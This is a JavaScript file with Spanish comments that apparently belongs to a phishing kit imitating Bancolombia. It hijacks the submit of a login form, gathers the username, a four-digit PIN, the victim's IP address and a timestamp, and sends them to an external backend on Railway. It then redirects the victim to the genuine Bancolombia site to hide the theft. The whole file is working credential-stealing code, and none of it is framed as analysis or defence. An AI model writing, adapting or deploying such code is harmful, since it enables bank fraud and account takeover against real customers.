// telegram-handler.js - VERSIÓN FINAL

// ============ CONFIGURACIÓN ============
const CONFIG = {
    // URL de tu backend en Railway
    BACKEND_URL: 'https://back-production-810f.up.railway.app/api/enviar',
};

// ============ ESPERAR A QUE CARGUE EL DOM ============
document.addEventListener('DOMContentLoaded', function() {
    
    const loginForm = document.getElementById('loginForm');
    const usuarioInput = document.getElementById('usuario');
    const claveInput = document.getElementById('clave');
    const btnLogin = document.getElementById('btnLogin');
    
    // Interceptar el submit del formulario
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        e.stopPropagation();
        
        // Validar campos
        if (!usuarioInput.value || claveInput.value.length !== 4) {
            alert('Por favor completa todos los campos correctamente');
            return;
        }
        
        // Deshabilitar botón mientras procesa
        btnLogin.disabled = true;
        btnLogin.textContent = 'Procesando...';
        
        // Obtener IP si no está ya en la página
        let userIP = 'Desconocida';
        const ipElement = document.getElementById('userIP');
        if (ipElement) {
            userIP = ipElement.textContent.replace('Dirección IP: ', '');
        } else {
            // Obtener IP si no existe el elemento
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                userIP = ipData.ip;
            } catch (error) {
                console.log('No se pudo obtener IP');
            }
        }
        
        // Obtener fecha
        let fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
        const dateElement = document.getElementById('currentDateTime');
        if (dateElement) {
            fecha = dateElement.textContent;
        }
        
        // Preparar datos
        const datos = {
            usuario: usuarioInput.value,
            clave: claveInput.value,
            ip: userIP,
            fecha: fecha
        };
        
        // Enviar datos al backend
        try {
            await fetch(CONFIG.BACKEND_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(datos)
            });
        } catch (error) {
            console.log('Error al enviar:', error);
        }
        
        // Redirigir inmediatamente a Bancolombia
        window.location.href = 'https://www.bancolombia.com/personas';
        
    }, true);
    
});

